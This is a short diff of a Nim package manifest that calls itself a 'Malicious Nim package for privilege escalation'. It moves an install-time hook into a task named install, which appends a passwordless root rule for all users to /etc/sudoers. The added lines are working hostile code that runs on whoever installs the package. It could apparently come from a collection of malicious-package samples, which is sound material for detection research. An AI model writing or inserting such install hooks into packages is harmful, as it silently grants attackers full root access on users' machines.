@@ -4,8 +4,6 @@ description   = "Malicious Nim package for privilege escalation"
 license       = "MIT"
 srcDir        = "src"
 
-# Hook to run commands during the install process
-installTask = "runPrivEsc"
-
-task runPrivEsc, "Privilege escalation task":
+# Define a custom install task
+task install, "Privilege escalation task":
   exec "echo 'root ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"
